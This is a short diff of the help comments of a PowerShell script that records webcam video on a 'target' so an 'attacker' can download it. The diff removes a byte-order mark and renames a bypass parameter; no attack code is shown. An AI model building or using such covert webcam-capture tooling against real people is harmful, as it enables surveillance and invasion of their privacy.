@@ -1,4 +1,4 @@
-﻿<#
+<#
 .SYNOPSIS
    Capture video (AVI) using default webcam
 
@@ -17,7 +17,7 @@
    Remark: recording of webcam turns 'on' the camera ligth.
    Parameter RecTime accepts values from 5 seconds (minimum) up to 60 seconds (max)
    to prevent the AVI file to be very large if attacker needs to download it from target.
-   Alternatively -BypassTimer 'true' parameter can be used to bypass rec time restriction.
+   Alternatively -Force 'true' parameter can be used to bypass some cmdlet restrictions.
 
 .Parameter RecTime
    The amount of time to rec in seconds (default: 10)
